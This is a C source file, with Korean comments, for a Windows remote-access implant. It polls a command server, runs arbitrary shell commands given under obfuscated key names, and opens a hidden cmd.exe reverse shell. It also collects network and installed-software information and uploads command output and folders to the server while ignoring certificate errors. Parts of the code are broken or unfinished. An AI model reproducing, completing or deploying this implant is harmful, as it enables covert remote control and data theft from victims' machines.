﻿#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
//
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>
#include "miniz.h"
#include "uploader_module.h"
#include "cJSON.h" // cJSON 라이브러리가 포함되어 있다고 가정
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")


// --- 상수 및 설정 ---
#define CHUNK_SIZE 4096             // 수신 버퍼 크기
#define REQUEST_BUFFER_SIZE 8192    // HTTP 요청 생성 버퍼 크기
#define MAX_OUTPUT_SIZE 4096 * 4    // 명령 결과 출력 최대 크기
#define SERVER_IP "192.168.30.129"
#define SERVER_PORT 8000
#define POLL_INTERVAL_SEC 10

// 🟢 클라이언트의 고유 식별자
#define CLIENT_ID "WORKER-C-001"    
static int e_flag = 0;
#pragma comment(lib, "ws2_32.lib")

// --- 함수 선언 ---
// [HTTP/Network]
char* http_request(const char* method, const char* path, const char* payload, int payload_len);
char* parse_http_response(const char* full_response, char** json_body);
// 파일 내용이 아닌, 메모리 문자열을 직접 보고합니다. (함수 이름은 유지)
void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code);

// [Execution & Utility]
void parse_command_json(const char* json_string);
char* execute_and_capture(const char* command, int* exit_code);
char* execute_and_capture2(const char* command, int* exit_code, int e_flag);
char* convert_to_utf8(const char* ansi_string);
// char* save_output_to_file(const char* output, int task_id, char* filename_buffer, size_t buffer_size); // 제거됨
// char* read_file_to_string(const char* filepath); // 제거됨
void execute_reverse_shell(int task_id, cJSON* payload);

// [Command Modules]
void execute_shell_command(int task_id, cJSON* payload);
void execute_file_download(int task_id, cJSON* payload);
void execute_get_sysinfo(int task_id, cJSON* payload);


// ----------------------------------------------------------------------
// 0. 인코딩 및 파일 유틸리티 함수 (수정 없음)
// ----------------------------------------------------------------------

// ANSI (CP_ACP) 인코딩의 명령 결과를 UTF-8로 변환합니다.
char* convert_to_utf8(const char* ansi_string) {
    if (!ansi_string || *ansi_string == '\0') {
        return strdup("");
    }

    int wlen = MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, NULL, 0);
    if (wlen == 0) return strdup("");

    wchar_t* wbuffer = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (!wbuffer) return strdup("");
    MultiByteToWideChar(CP_ACP, 0, ansi_string, -1, wbuffer, wlen);

    int utf8len = WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, NULL, 0, NULL, NULL);
    if (utf8len == 0) { free(wbuffer); return strdup(""); }

    char* utf8_buffer = (char*)malloc(utf8len);
    if (!utf8_buffer) { free(wbuffer); return strdup(""); }
    WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, utf8_buffer, utf8len, NULL, NULL);

    free(wbuffer);
    return utf8_buffer; // 호출자가 free 해야 함
}

// ----------------------------------------------------------------------
// 1. 명령 모듈 정의 (Command Modules)
// ----------------------------------------------------------------------

// ... execute_reverse_shell 함수는 변경 없음 (생략) ...
void execute_reverse_shell(int task_id, cJSON* payload) {
    // ... 기존 리버스 셸 로직 유지 ...
    cJSON* ip_item = cJSON_GetObjectItemCaseSensitive(payload, "ip");
    cJSON* port_item = cJSON_GetObjectItemCaseSensitive(payload, "port");

    if (!cJSON_IsString(ip_item) || !cJSON_IsNumber(port_item)) {
        fprintf(stderr, "[ERROR] REVERSE_SHELL_CONNECT: IP 또는 Port가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "IP 또는 Port 매개변수가 누락되었습니다.", 1);
        return;
    }

    const char* server_ip = ip_item->valuestring;
    int server_port = port_item->valueint;

    printf("\n[MODULE] REVERSE_SHELL_CONNECT: %s:%d 로 리버스 셸 연결 시도.\n", server_ip, server_port);

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    wchar_t wserver_ip[256];
    MultiByteToWideChar(CP_UTF8, 0, server_ip, -1, wserver_ip, 256);

    hSession = WinHttpOpen(L"HTTPSClient/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        report_file_to_server(task_id, "FAILED", "rs_error.txt", "Failed to open WinHTTP session.", 1);
        return;
    }

    hConnect = WinHttpConnect(hSession,
        wserver_ip,
        server_port,
        0);

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        report_file_to_server(task_id, "FAILED", "connection_fail.txt", "Failed to connect.", 1);
        return;
    }

    hRequest = WinHttpOpenRequest(hConnect,
        L"GET",
        L"/",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE); // HTTPS

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        report_file_to_server(task_id, "FAILED", "connection_fail.txt", "Failed to open request.", 1);
        return;
    }

    // HTTPS 서버에 요청
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        report_file_to_server(task_id, "FAILED", "connection_fail.txt", "Failed to send request.", 1);
        return;
    }

    // 응답 수신
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        report_file_to_server(task_id, "FAILED", "connection_fail.txt", "Failed to receive response.", 1);
        return;
    }
    

    printf("[INFO] 서버 연결 성공. WinAPI를 통해 셸 I/O 연결 시작.\n");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = (HANDLE)shell_socket;
    si.hStdOutput = (HANDLE)shell_socket;
    si.hStdError = (HANDLE)shell_socket;
    si.wShowWindow = SW_HIDE;

    char cmdLine[] = "cmd.exe /K";

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[ERROR] 셸 프로세스 생성 실패. Code: %d\n", GetLastError());
        closesocket(shell_socket);
        report_file_to_server(task_id, "FAILED", "rs_process_fail.txt", "Failed to launch shell process.", 1);
        return;
    }

    printf("[INFO] 셸 프로세스 (cmd.exe)가 소켓 핸들을 상속받아 백그라운드에서 실행됩니다.\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    char report_content[256];
    snprintf(report_content, sizeof(report_content),
        "WinAPI Reverse shell session to %s:%d has been initiated.",
        server_ip, server_port);

    report_file_to_server(task_id, "COMPLETED", "rs_session_start_api.txt", report_content, 0);
}


/**
 * @brief EXECUTE_SHELL 모듈: 쉘 명령을 실행하고 결과를 서버에 보고합니다. (파일 저장 로직 제거)
 */
void execute_shell_command(int task_id, cJSON* payload_item) {
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "coca");
    cJSON* args_item = cJSON_GetObjectItemCaseSensitive(payload_item, "cola");

    if (cJSON_IsString(cmd_item) && cJSON_IsArray(args_item)) {
        const char* base_command = cmd_item->valuestring;
        char full_command[1024];

        // --- 명령 구성 로직 ---
        memset(full_command, 0, sizeof(full_command));
        strncpy(full_command, base_command, sizeof(full_command) - 1);
        full_command[sizeof(full_command) - 1] = '\0';

        cJSON* arg = NULL;
        int remaining_space = sizeof(full_command) - strlen(full_command);

        cJSON_ArrayForEach(arg, args_item) {
            if (cJSON_IsString(arg) && remaining_space > 0) {
                if (remaining_space > 1) {
                    strcat(full_command, " ");
                    remaining_space--;
                }
                strncat(full_command, arg->valuestring, remaining_space);
                remaining_space = sizeof(full_command) - strlen(full_command);
            }
        }
        // --- 명령 구성 로직 끝 ---

        printf("\nfull_command: %s\n", full_command);

        int exit_code = 0;
        // 1. 명령 실행 및 표준 출력(ANSI)을 메모리로 캡처
        char* output = execute_and_capture2(full_command, &exit_code, 1);
        // 2. ANSI 출력을 UTF-8로 변환 (서버에서 안전하게 표시하기 위함)
        char* utf8_output = convert_to_utf8(output);

        // 3. 파일 저장 및 읽기 단계를 건너뛰고, 메모리 문자열을 바로 보고
        const char* report_status = (exit_code == 0) ? "COMPLETED" : "FAILED";
        // 서버 UI에서 인식할 가상의 파일명 (실제 파일은 생성되지 않음)
        const char* ui_filename = "stdout_report.txt";

        //printf("[INFO] 명령 실행 결과(UTF-8)를 파일 저장 없이 바로 서버에 보고합니다.\n");

        // 4. 서버에 보고 (직접 메모리 버퍼 전달)
        report_file_to_server(task_id, report_status, ui_filename, utf8_output, exit_code);

        //////////if (utf8_output) free(utf8_output);
        ///////////////if (output) free(output);
    }
    else {
        //printf("[ERROR] EXECUTE_SHELL: 'c' 또는 'a'가 누락되었습니다.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing command or arguments.", 1);
    }
}


// ... execute_file_download 함수는 변경 없음 (생략) ...
void execute_file_download(int task_id, cJSON* payload) {
    cJSON* url_item = cJSON_GetObjectItemCaseSensitive(payload, "url");
    cJSON* path_item = cJSON_GetObjectItemCaseSensitive(payload, "path");

    if (cJSON_IsString(url_item) && cJSON_IsString(path_item)) {
        printf("[MODULE] FILE_DOWNLOAD: 다운로드 요청 감지.\n");
        // ... 실제 다운로드 로직은 여기에 구현해야 합니다. ...
        int exit_code = 0;
        char filename[] = "download_log.txt";
        char report_content[] = "File download simulation completed.";
        report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);
    }
    else {
        printf("[ERROR] FILE_DOWNLOAD: Missing URL or Path in payload.\n");
        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing URL or Path parameters.", 1);
    }
}

// ... execute_get_sysinfo 함수는 변경 없음 (생략) ...
void execute_get_sysinfo(int task_id, cJSON* payload) {
    printf("[MODULE] GET_SYSINFO: 시스템 정보 수집 요청 감지.\n");
    // ... 실제 정보 수집 로직은 여기에 구현해야 합니다. ...
    
    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload, "command");
    char full_command[1024];

    //if(strcmp(cmd_item->valuestring, ))
    // --- 명령 구성 로직 ---
    memset(full_command, 0, sizeof(full_command));
    int len = snprintf(full_command, sizeof(full_command), "netstat -ano >> result.txt ");
    len+= snprintf(full_command +len, sizeof(full_command)-len, "&& ipconfig >> result.txt ");
    len+= snprintf(full_command + len, sizeof(full_command)-len, "&& reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall >> result.txt");
    full_command[sizeof(full_command) - 1] = '\0';
    int exit_code = 0;
    e_flag = 1;
    printf("full_command:%s\n", full_command);
    char* output = execute_and_capture2(full_command, &exit_code, e_flag);

    //http_request(const char* method, const char* path, const char* payload, int payload_len)

    
    
    char filename[] = "result.txt";
    char report_content[] = "File download simulation completed.";
    report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);




    //char filename[] = "system_report.txt";
    //char report_content[] = "System info gathered: OS=Windows, RAM=16GB (Simulated)";
    //report_file_to_server(task_id, "COMPLETED", filename, report_content, exit_code);



}


// ----------------------------------------------------------------------
// 2. cJSON 파싱 및 명령 디스패처 (Command Dispatcher) (변경 없음)
// ----------------------------------------------------------------------

void parse_command_json(const char* json_string) {
    cJSON* root = cJSON_Parse(json_string);
    if (root == NULL) {
        fprintf(stderr, "[ERROR] cJSON 파싱 실패.\n");
        return;
    }

    cJSON* status_item = cJSON_GetObjectItemCaseSensitive(root, "status");

    if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "command_assigned") == 0) {
        cJSON* id_item = cJSON_GetObjectItemCaseSensitive(root, "command_id");
        cJSON* name_item = cJSON_GetObjectItemCaseSensitive(root, "command_name");
        cJSON* payload_item = cJSON_GetObjectItemCaseSensitive(root, "payload");
        cJSON* client_id_item = cJSON_GetObjectItemCaseSensitive(root, "client_id");

        if (cJSON_IsString(name_item) && cJSON_IsObject(payload_item) && cJSON_IsNumber(id_item)) {
            const char* command_name = name_item->valuestring;
            int task_id = id_item->valueint;

            if (cJSON_IsString(client_id_item)) {
                printf("[EXEC] 작업 할당 완료. Task ID: %d, 명령: %s, 대상 클라이언트 ID: %s\n", task_id, command_name, client_id_item->valuestring);
            }

            // 🚩 명령 디스패처 (Command Dispatcher)
            if (strcmp(command_name, "ee") == 0) {
                execute_shell_command(task_id, payload_item);
            }
            else if (strcmp(command_name, "SHELL_CONNECT") == 0) {
                execute_reverse_shell(task_id, payload_item);
                }

            else if (strcmp(command_name, "FILE_DOWNLOAD") == 0) {
                cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "command");
                //execute_file_download(task_id, payload_item);
                printf("payload:%s", cmd_item->valuestring);
                run_file_upload(cmd_item->valuestring);

            }
            else if (strcmp(command_name, "GET_SYSINFO") == 0) {
                execute_get_sysinfo(task_id, payload_item);
            }

            //int run_file_upload(const char* folder)



            else {
                printf("[WARNING] 알 수 없는 명령 유형: %s\n", command_name);
                report_file_to_server(task_id, "FAILED", "error_log.txt", "Unknown command name received.", 1);
            }
        }
    }
    else if (cJSON_IsString(status_item) && strcmp(status_item->valuestring, "no_command") == 0) {
        printf("[POLL] 대기 중인 명령 없음.\n");
    }
    else {
        printf("[POLL] 서버 응답: %s\n", cJSON_IsString(status_item) ? status_item->valuestring : "Unknown Status");
    }

    cJSON_Delete(root);
}

// ----------------------------------------------------------------------
// 3. HTTP 요청 및 응답 처리 함수 (변경 없음)
// ----------------------------------------------------------------------

int main() {

    while (1) {
        printf("\n--- %d초 폴링 대기 중 ---\n", POLL_INTERVAL_SEC);
        Sleep(POLL_INTERVAL_SEC * 1000);

        char poll_path[128];
        snprintf(poll_path, sizeof(poll_path), "/api/poll/?client_id=%s", CLIENT_ID);

        printf("[INFO] 서버에 명령 폴링 요청: %s\n", poll_path);

        char* full_response = http_request("GET", poll_path, NULL, 0);
        printf("full_response:%s", full_response);
        if (full_response != NULL) {
            char* json_body = NULL;
            parse_http_response(full_response, &json_body);

            if (json_body != NULL) {
                printf("[INFO] JSON 본문 수신: %s\n", json_body);
                parse_command_json(json_body);
                free(json_body);
            }
            else {
                fprintf(stderr, "\n[ERROR] HTTP 본문 추출 실패 또는 빈 응답.\n");
            }
            free(full_response);
        }
        else {
            fprintf(stderr, "[ERROR] HTTP 요청 실패. 다음 폴링 대기.\n");
        }
    }

    return 0;
}

char* http_request(const char* method, const char* path, const char* payload, int payload_len) {

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResult = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    char* response_buffer = NULL;
    int total_len = 0;

    // 세션 생성 (자동 SSL/TLS 지원)
    hSession = WinHttpOpen(L"WinHTTP Client/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) goto cleanup;

    // 서버 연결
    wchar_t wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, SERVER_IP, -1, wHost, 256);

    hConnect = WinHttpConnect(hSession, wHost, SERVER_PORT, 0);
    if (!hConnect) goto cleanup;

    // 경로 변환
    wchar_t wPath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wPath, 512);

    // HTTP method 변환
    wchar_t wMethod[16];
    MultiByteToWideChar(CP_UTF8, 0, method, -1, wMethod, 16);

    hRequest = WinHttpOpenRequest(
        hConnect,
        wMethod,
        wPath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE    // ★ HTTPS 활성화
    );

    if (!hRequest) goto cleanup;

    DWORD flags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));





    // POST인 경우 payload 설정
    if (_stricmp(method, "POST") == 0) {
        bResult = WinHttpSendRequest(
            hRequest,
            L"Content-Type: application/json\r\n",
            -1,
            (LPVOID)payload,
            payload_len,
            payload_len,
            0
        );
    }
    else {
        bResult = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            WINHTTP_NO_REQUEST_DATA,
            0,
            0,
            0
        );
    }

    if (!bResult) goto cleanup;

    // 응답 대기
    bResult = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResult) goto cleanup;

    // 응답 데이터를 계속 읽어서 full_response 생성
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            break;

        if (dwSize == 0) break;

        char* temp = realloc(response_buffer, total_len + dwSize + 1);
        if (!temp) break;

        response_buffer = temp;

        if (!WinHttpReadData(hRequest, response_buffer + total_len, dwSize, &dwDownloaded))
            break;

        total_len += dwDownloaded;
        response_buffer[total_len] = '\0';

    } while (dwSize > 0);

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response_buffer;
}


char* parse_http_response(const char* full_response, char** json_body) {

    if (!full_response) {
        return NULL;
    }

    // WinHTTP에서는 full_response 자체가 바디(=JSON)
    size_t len = strlen(full_response);
    if (len == 0) {
        return NULL;
    }

    *json_body = (char*)malloc(len + 1);
    if (!*json_body) {
        return NULL;
    }

    strcpy(*json_body, full_response);

    // full_response 자체가 body이므로 그대로 반환
    return *json_body;
}


// 파일 내용을 읽지 않고, 인수로 전달받은 raw_content(메모리 문자열)를 바로 JSON에 포함하여 전송합니다.
void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code) {
    cJSON* report_json = cJSON_CreateObject();

    cJSON_AddNumberToObject(report_json, "command_id", task_id);
    cJSON_AddStringToObject(report_json, "status", status);
    // 이 파일명은 실제 파일이 아닌, 서버 UI에서 이 보고서를 구분하는 이름입니다.
    cJSON_AddStringToObject(report_json, "filename", filename_for_ui);

    // **핵심 변경**: raw_content(명령 실행 결과)를 file_content 필드에 직접 포함
    cJSON_AddStringToObject(report_json, "file_content", raw_content ? raw_content : "No content captured.");
    cJSON_AddNumberToObject(report_json, "exit_code", exit_code);

    char* json_payload = cJSON_PrintUnformatted(report_json);

    if (json_payload) {
        printf("\n[REPORT] 서버에 메모리 문자열 JSON 보고: /api/upload/receive/\n");

        char* response = http_request("POST", "/api/upload/receive/", json_payload, strlen(json_payload));

        if (response != NULL) {
            printf("[INFO] 보고 응답 수신.\n");
            free(response);
        }
        else {
            fprintf(stderr, "[ERROR] 보고서 전송 실패.\n");
        }

        free(json_payload);
    }
    else {
        fprintf(stderr, "[ERROR] 보고 JSON 생성 실패.\n");
    }

    cJSON_Delete(report_json);
}

// ----------------------------------------------------------------------
// 4. 명령 실행 및 결과 캡처 함수 (_popen 사용) (변경 없음)
// ----------------------------------------------------------------------

char* execute_and_capture2(const char* command, int* exit_code, int e_flag) {
    FILE* fp;
    char buffer[256];
    char* result_output = (char*)malloc(MAX_OUTPUT_SIZE);
    char* output_filename = "result.txt";
    char* new_filename = "C:\\test\\result.txt";\
    FILE* fp2 = fopen(new_filename, "a");
    


    if (result_output == NULL) {
        *exit_code = -1;
        return strdup("[ERROR] Memory allocation failed for command output.");
    }
    result_output[0] = '\0';

    fp = _popen(command, "r");
    if (fp == NULL) {
        *exit_code = -1;
        sprintf(result_output, "[ERROR] Failed to execute command via _popen: %s", command);
        return result_output;
    } 
    char buffer3[1024];
    while (fgets(buffer3, sizeof(buffer3), fp) != NULL) {
        size_t buffer_len = strlen(buffer3);
        printf("%s", buffer3);
        fwrite(buffer3, sizeof(char), strlen(buffer3), fp2);
    } 

    fclose(fp);
    printf("result_output:%s\n", result_output);

    fclose(fp2);
    printf("creation");

     
    MoveFileA(output_filename, new_filename);
    Sleep(3000);
    DWORD dwThreadId = 0;
    HANDLE hThread = NULL;
    //printf("thisis1\n");
   //////////// hThread = CreateThread(NULL, 0, run_file_upload, e_flag, 0, dwThreadId);
    //printf("thisis3\n");

    //_pclose(fp);
    CloseHandle(hThread);

    
}

char* execute_and_capture(const char* command, int* exit_code) {



}